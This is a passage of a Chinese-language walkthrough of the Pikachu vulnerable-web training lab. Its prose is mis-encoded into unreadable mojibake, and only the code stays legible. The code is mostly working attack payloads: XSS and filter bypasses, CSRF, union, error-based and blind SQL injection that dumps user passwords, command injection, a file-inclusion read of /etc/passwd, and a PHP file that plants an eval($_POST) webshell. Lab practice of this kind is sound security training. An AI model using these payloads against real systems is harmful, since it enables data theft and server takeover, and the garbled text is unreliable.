<li>åŒä¸Šï¼Œæ ¹æ® burpæŠ“åŒ…ï¼Œåœ¨repeaterä¸­é‡å¤å‘é€ï¼ŒéªŒè¯ç å¹¶æ²¡æœ‰ä½œç”¨ï¼Œè§‚å¯Ÿæºç ï¼Œå‘ç°å…¶éªŒè¯ç ä¸ºå‰ç«¯éªŒè¯ï¼Œæ‰€ä»¥éªŒè¯ç æ ¹æœ¬æ²¡æœ‰ä»€ä¹ˆä½œç”¨ã€‚</li>
<li>çˆ†ç ´æ”»å‡»æ€è·¯åŒä¸Šã€‚</li>
</ul>
<h2 id="tokené˜²çˆ†ç ´"><a href="#tokené˜²çˆ†ç ´" class="headerlink" title="tokené˜²çˆ†ç ´"></a>tokené˜²çˆ†ç ´</h2><ul>
<li>å¸¦æœ‰tokenï¼Œä¸€èˆ¬æ¥è¯´çœŸå®ç½‘ç«™ä¸­å¸¦æœ‰tokenï¼Œå¤šåŠå°±å¯ä»¥æ”¾å¼ƒäº†ï¼Œä½†æ˜¯é¶åœºä¸­è‚¯å®šæœ‰è§£å†³æ–¹æ³•ã€‚</li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fd98a08a9c684acb8f1237e0b44abd64~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p>
<blockquote>
<p>é€šè¿‡bpä¸­çš„Grep-Extract åŠŸèƒ½æˆªå–tokenï¼Œçˆ†ç ´ï¼Œç”±äºæˆ‘çš„burp suiteæ±‰åŒ–åï¼Œæ²¡æœ‰Grep-ExtractåŠŸèƒ½äº†ã€‚æ•…é“¾æ¥è‡³å…¶ä»–å¸ˆå‚…åšå®¢ã€‚(<a href="https://www.jianshu.com/p/f218735806de">https://www.jianshu.com/p/f218735806de</a>)</p>
</blockquote>
<h1 id="0x02-XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰"><a href="#0x02-XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰" class="headerlink" title="0x02 XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰"></a>0x02 XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰</h1><p>ä¸€.åå°„æ€§xss(get): </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt; </span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> /<span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">console.log(123)</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>äºŒ.åå°„æ€§xss(post): </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>ä¸‰.å­˜å‚¨æ€§xss: </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>å››.DOMå‹xss: </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt; </span><br></pre></td></tr></table></figure>
<p>äº”.DOMå‹xss-x: </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt; </span><br></pre></td></tr></table></figure>
<p>å…­.xssç›²æ‰“ï¼š </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt; è¯´æ˜è¯¥æäº¤æ–¹å¼ä¸ºpostï¼Œæäº¤çš„å†…å®¹ä¼šåœ¨åå°è¢«æ¥å—æ‰§è¡Œï¼Œæ•…å¯ç›—å–ç®¡ç†å‘˜cookie </span><br></pre></td></tr></table></figure>
<p>ä¸ƒ.xssè¿‡æ»¤ï¼š è¯´æ˜è¯¥å…³å¡ä¼šä½¿ç”¨æ­£åˆ™å¯¹&lt;scriptè¿›è¡Œæ›¿æ¢ä¸ºç©º,ä¹Ÿå°±æ˜¯è¿‡æ»¤äº†ã€‚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;/p&gt;&lt;a href=&quot;www.baidu.com&quot;&gt;11111&lt;/a&gt;&lt;p&gt;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&lt;/p&gt;&lt;a onclick=alert(&quot;xss&quot;)&gt;11111&lt;p&gt;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&lt;/p&gt;&lt;a onclick=alert(&quot;xss&quot;)&gt;å…³æ³¨CVultra&lt;/a&gt;&lt;p&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>å…«.xssä¹‹htmlspecialchars:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span><span class="title function_">alert</span>(<span class="number">111</span>)<span class="string">&#x27; </span></span><br><span class="line"><span class="string">&#x27;</span> onmouseover=<span class="string">&#x27;alert(111)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>ä¹.xssä¹‹hrefè¾“å‡º:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>å.xssä¹‹jsè¾“å‡ºï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</span></span><br></pre></td></tr></table></figure>
<h1 id="0x03-CSRF-è·¨ç«™è¯·æ±‚ä¼ªé€ "><a href="#0x03-CSRF-è·¨ç«™è¯·æ±‚ä¼ªé€ " class="headerlink" title="0x03 CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )"></a>0x03 CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )</h1><h2 id="ä¸€-CSRFï¼ˆGETï¼‰"><a href="#ä¸€-CSRFï¼ˆGETï¼‰" class="headerlink" title="ä¸€.CSRFï¼ˆGETï¼‰"></a>ä¸€.CSRFï¼ˆGETï¼‰</h2><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/db277f9a72c3472cbf4950cf22cb18dd~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<blockquote>
<p>å‚æ•°é€šè¿‡GETè¯·æ±‚ä¼ å‚ï¼Œä¿®æ”¹URLä¸­çš„å€¼å³å¯ä¿®æ”¹ä¿¡æ¯ã€‚é€šè¿‡çŸ­ç½‘å€è½¬æ¢ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»å³å¯ã€‚</p>
</blockquote>
<h2 id="äºŒ-CSRFï¼ˆPOSTï¼‰"><a href="#äºŒ-CSRFï¼ˆPOSTï¼‰" class="headerlink" title="äºŒ.CSRFï¼ˆPOSTï¼‰"></a>äºŒ.CSRFï¼ˆPOSTï¼‰</h2><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ee5db522d7d245ffafc30bcc0c1ee3cc~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<blockquote>
<p>é€šè¿‡POSTä¼ å‚ï¼Œåœ¨hackbarä¸­é€šè¿‡POSTæäº¤å³å¯æ›´æ”¹æ•°æ®ã€‚</p>
</blockquote>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2d692d93b64549f8bde08e54f8fd6659~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h2 id="äºŒ-CSRFï¼ˆTokenï¼‰"><a href="#äºŒ-CSRFï¼ˆTokenï¼‰" class="headerlink" title="äºŒ.CSRFï¼ˆTokenï¼‰"></a>äºŒ.CSRFï¼ˆTokenï¼‰</h2><blockquote>
<p>çœŸå®ç¯å¢ƒä¸‹ï¼Œå¢åŠ tokenåå¯ä»¥åŠå…¶æœ‰æ•ˆçš„é˜²æ­¢æ”»å‡»ã€‚é‚£ä¹ˆåœ¨è¿™ä¸ªé¶åœºä¸­ï¼Œåº”è¯¥å¯ä»¥é‡‡ç”¨ æš´åŠ›ç ´è§£â€“ã€‹tokenä¸­çš„åšæ³•ï¼Œè¿›è¡Œæ”»å‡»(ä»…ä»…æ˜¯æ€è·¯ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½æˆåŠŸï¼)</p>
</blockquote>
<h1 id="0x04-Sql-Inject-SQLæ³¨å…¥"><a href="#0x04-Sql-Inject-SQLæ³¨å…¥" class="headerlink" title="0x04 Sql Inject(SQLæ³¨å…¥)"></a>0x04 Sql Inject(SQLæ³¨å…¥)</h1><h2 id="æ•°å­—å‹æ³¨å…¥"><a href="#æ•°å­—å‹æ³¨å…¥" class="headerlink" title="æ•°å­—å‹æ³¨å…¥"></a>æ•°å­—å‹æ³¨å…¥</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">åˆ¤æ–­å­—æ®µæ•°ï¼š</span><br><span class="line">    id<span class="operator">=</span><span class="number">0</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span><span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2 </span></span><br><span class="line">    id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span><span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line">    id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2 </span></span><br><span class="line">    id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line">    </span><br><span class="line">ç¡®å®šæ•°æ®åº“åç§°ï¼š</span><br><span class="line">    id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()<span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line">  </span><br><span class="line">ç¡®å®šè¡¨åï¼š</span><br><span class="line">    id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span><span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line">    </span><br><span class="line">ç¡®å®šå­—æ®µåï¼š</span><br><span class="line">    id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line">ç¡®å®šå­—æ®µå€¼ï¼š</span><br><span class="line">    id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(id,<span class="number">0x3a</span>,username,<span class="number">0x2c</span>,password,<span class="number">0x3b</span>,level) <span class="keyword">from</span> users<span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line">    ä¸ºäº†ç¾è§‚æ˜¾ç¤ºå¯ä»¥å†™æˆè¿™æ ·ï¼š</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(id,<span class="number">0x3a</span>,username,<span class="number">0x2c</span>,password,<span class="number">0x2c</span>,level,<span class="number">0x3c</span>,<span class="number">0x3e</span>) <span class="keyword">from</span> users<span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br></pre></td></tr></table></figure>
<h2 id="å­—ç¬¦å‹æ³¨å…¥"><a href="#å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥"></a>å­—ç¬¦å‹æ³¨å…¥</h2><p>é—­åˆï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>ä¸€.åˆ¤æ–­å­—æ®µæ•°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/vul/sqli/sqli_str.php?name=kobe&#x27; order by 2 --+ &amp;submit=%E6%9F%A5%E8%AF%A2   //ä¸çŸ¥é“ä¸ºä»€ä¹ˆ#ä¸èƒ½æ³¨é‡Š</span><br></pre></td></tr></table></figure>

<p>äºŒ.å‘µå‘µï¼Œä¸€æŠŠæ¢­å“ˆâ€¦.ç®—äº†ï¼Œè¿˜æ˜¯æ‰‹å·¥å§</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_str.php?name<span class="operator">=</span>kobe<span class="string">&#x27; union select user(),@@version_compile_os --+ &amp;submit=%E6%9F%A5%E8%AF%A2    </span></span><br><span class="line"><span class="string">//ç»“æœæ˜¯  root/linux</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/vul/sqli/sqli_str.php?name=kobe&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>(),group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata <span class="comment">--+ &amp;submit=%E6%9F%A5%E8%AF%A2 </span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>ç»“æœæ˜¯ï¼šinformation_schema,mysql,performance_schema,pikachu,sys</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_str.php?name<span class="operator">=</span>kobe<span class="string">&#x27; union select user(),group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27; --+ &amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line"><span class="string">//ç»“æœä¸ºï¼š httpinfo,member,message,users,xssblind</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/vul/sqli/sqli_str.php?name=kobe&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>(),group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+ &amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>ç»“æœä¸ºï¼š<span class="keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_str.php?name<span class="operator">=</span>kobe<span class="string">&#x27; union select user(),group_concat(id,0x3a,username,0x3a,password,0x3a,level) from users --+ &amp;submit=%E6%9F%A5%E8%AF%A2    </span></span><br><span class="line"><span class="string">//ä¸å°±å‡ºæ¥äº†å—</span></span><br></pre></td></tr></table></figure>
<h2 id="æœç´¢å‹æ³¨å…¥"><a href="#æœç´¢å‹æ³¨å…¥" class="headerlink" title="æœç´¢å‹æ³¨å…¥"></a>æœç´¢å‹æ³¨å…¥</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_search.php?name<span class="operator">=</span>kobe<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">90</span><span class="operator">%</span><span class="number">9</span>C<span class="operator">%</span>E7<span class="operator">%</span>B4<span class="operator">%</span>A2   <span class="operator">/</span><span class="operator">/</span>è·Ÿä¸Šé¢ä¸€æ‘¸ä¸€æ ·</span><br></pre></td></tr></table></figure>
<h2 id="xxå‹æ³¨å…¥"><a href="#xxå‹æ³¨å…¥" class="headerlink" title="xxå‹æ³¨å…¥"></a>xxå‹æ³¨å…¥</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_x.php?name<span class="operator">=</span>kobe<span class="operator">%</span><span class="number">27</span>)<span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>(<span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span><span class="operator">=</span><span class="operator">%</span><span class="number">271</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2#</span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_x.php?name<span class="operator">=</span>kobe<span class="operator">%</span><span class="number">27</span>)<span class="operator">%</span><span class="number">20</span><span class="keyword">or</span><span class="operator">%</span><span class="number">20</span>(<span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span><span class="operator">=</span><span class="operator">%</span><span class="number">271</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2#</span><br></pre></td></tr></table></figure>
<ul>
<li>æˆåŠŸé—­åˆï¼Œåç»­æ€è·¯åŒä¸Šã€‚</li>
</ul>
<h2 id="â€œinsert-x2F-updateâ€æ³¨å…¥"><a href="#â€œinsert-x2F-updateâ€æ³¨å…¥" class="headerlink" title="â€œinsert&#x2F;updateâ€æ³¨å…¥"></a>â€œinsert&#x2F;updateâ€æ³¨å…¥</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">æŸ¥è¯¢æ•°æ®åº“å:</span><br><span class="line">            cvultra<span class="string">&#x27; or updatexml(1,concat(0x7e,database()),0) or&#x27;</span></span><br><span class="line">             </span><br><span class="line">æŸ¥è¯¢ç‰ˆæœ¬å·ï¼š</span><br><span class="line">            cvultra<span class="string">&#x27; or updatexml(1,concat(0x7e,version()),0) or&#x27;</span></span><br><span class="line">æŸ¥è¯¢pikachu<span class="comment">--&gt;ä¸‹çš„è¡¨åï¼š</span></span><br><span class="line">            cvultra<span class="string">&#x27; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27; limit 0,1)),0) or&#x27;</span></span><br><span class="line">å…¶ä»–æŸ¥è¯¢ï¼Œä¸ä¸Šé¢æ–¹æ³•ä¸€è‡´....</span><br></pre></td></tr></table></figure>
<p>ä¸ºä»€ä¹ˆé‡‡ç”¨concatå‡½æ•°å»æŸ¥è¯¢ï¼Œè€Œä¸æ˜¯ group_concat?</p>
<p>ç­”ï¼šæ ¹æ®æŠ¥é”™ä¿¡æ¯ï¼Œä½¿ç”¨group_concatæŠ¥é”™ï¼Œâ€œç»„æ— æ•ˆâ€ã€‚<br><a href="https://blog.csdn.net/xiao__jia__jia/article/details/103663284">è¶…é“¾æ¥â€“&gt;ç‚¹å‡»</a><br><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2c4bc1ad952a44f88630b6ec7833ecd5~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h2 id="deleteæ³¨å…¥"><a href="#deleteæ³¨å…¥" class="headerlink" title="deleteæ³¨å…¥"></a>deleteæ³¨å…¥</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">æŸ¥è¯¢æ•°æ®åº“åï¼š</span><br><span class="line">            <span class="number">61</span><span class="operator">+</span><span class="keyword">or</span><span class="operator">+</span>updatexml<span class="operator">+</span>(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database()),<span class="number">0</span>)</span><br><span class="line">å…¶ä»–æŸ¥è¯¢å¦‚ä¸Šæ‰€ç¤º....</span><br></pre></td></tr></table></figure>

<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d8db3a1201de4bb0af1cc5831f3ac5bb~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h2 id="â€œhttp-headerâ€æ³¨å…¥"><a href="#â€œhttp-headerâ€æ³¨å…¥" class="headerlink" title="â€œhttp headerâ€æ³¨å…¥"></a>â€œhttp headerâ€æ³¨å…¥</h2><ul>
<li>é¦–å…ˆç™»é™†è´¦æˆ·  admin&#x2F;123456</li>
<li>å°†User-Agentåé¢çš„å€¼æ›¿æ¢ä¸ºï¼š<code>1&#39; or updatexml(1, concat(0x7e, database()), 0) or &#39;</code></li>
<li>åç»­æµ‹è¯• åŒä¸Š</li>
</ul>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/19b040290b2446ba8a8bd3259307837c~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h2 id="å¸ƒå°”å‹ç›²æ³¨"><a href="#å¸ƒå°”å‹ç›²æ³¨" class="headerlink" title="å¸ƒå°”å‹ç›²æ³¨"></a>å¸ƒå°”å‹ç›²æ³¨</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ vince<span class="string">&#x27;#     ä¸æŠ¥é”™ï¼Œè¯´æ˜å­˜åœ¨æ³¨å…¥ï¼Œä¸”ä¸ºå•å¼•å·é—­åˆ</span></span><br><span class="line"><span class="string">åˆ¤æ–­æ•°æ®åº“é•¿åº¦ï¼š      Vince&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;=</span><span class="number">1</span> #</span><br><span class="line">........   æ–¹æ³•å›ºå®šï¼Œä¸å†é˜è¿°</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="æ—¶é—´å‹ç›²æ³¨"><a href="#æ—¶é—´å‹ç›²æ³¨" class="headerlink" title="æ—¶é—´å‹ç›²æ³¨"></a>æ—¶é—´å‹ç›²æ³¨</h2><blockquote>
<p>ä¸€.Vinceâ€™ and sleep(5)#<br>     å»¶é•¿5ç§’åæ˜¾ç¤ºï¼Œè¯´æ˜æ„é€ æ­£ç¡®</p>
<p>äºŒ.è¯ä¸å¤šè¯´ï¼Œsqlmapè·‘ï¼Œå‡ºç»“æœ</p>
</blockquote>
<h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><ul>
<li>burp suiteæŠ“åŒ…ï¼Œå°†username æ›¿æ¢ä¸º root %dfâ€™ or 1&#x3D;1 #<br><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f3bb3e897fb34358a2a066c6080d9284~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></li>
</ul>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="execâ€pingâ€"><a href="#execâ€pingâ€" class="headerlink" title="execâ€pingâ€"></a>execâ€pingâ€</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1&amp;net user</span><br><span class="line">..........</span><br></pre></td></tr></table></figure>

<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1523d33da2b04348aeb70479e291e53e~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h2 id="execâ€evalâ€"><a href="#execâ€evalâ€" class="headerlink" title="execâ€evalâ€"></a>execâ€evalâ€</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ipconfig&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/356fdf97f26e4d78a58d2451531e0911~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7566f2563e5d4e53b066ca884dc9cb3c~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h1 id="File-inclusion"><a href="#File-inclusion" class="headerlink" title="File inclusion"></a>File inclusion</h1><h2 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.æœ¬åœ°æ–‡ä»¶åŒ…å«:ä»…èƒ½å¤Ÿå¯¹æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶è¿›è¡Œè¯»å–ï¼Œæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚(ä¾‹ï¼›linuxä¸­è¯»å–æ•æ„Ÿä»¶:../../../../../ï¼‰</span><br><span class="line">	payloadï¼›</span><br><span class="line">			?filename=../../../../../../../etc/passwd&amp;submit=æäº¤æŸ¥è¯¢</span><br><span class="line">			...........				//æ€»ä¹‹å±å®³æƒ…å†µè§†å…·ä½“æƒ…å†µè€Œå®š</span><br></pre></td></tr></table></figure>

<h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ­¤æ¼æ´ï¼Œå¤§æœ‰å¯ä¸ºï¼</span></span><br><span class="line"><span class="comment">//æ€è·¯</span></span><br><span class="line">	<span class="number">1</span>.åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ¶æ„PHPæ–‡ä»¶ï¼Œæ­¤æ¶æ„æ–‡ä»¶å¯ä»¥åœ¨æ¼æ´æœºä¸Šæ‰§è¡Œï¼Œå¹¶å‘å…¶ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</span><br><span class="line">	   <span class="comment">//æˆ‘ä½¿ç”¨æœ¬åœ°æœåŠ¡å™¨(127.0.0.1)</span></span><br><span class="line">	  æœ¬åœ°æ‹PHPæ–‡ä»¶ä¸ºï¼štest.php</span><br><span class="line">	test.php: <span class="meta">&lt;?php</span> <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;muma.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[hacker]);?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
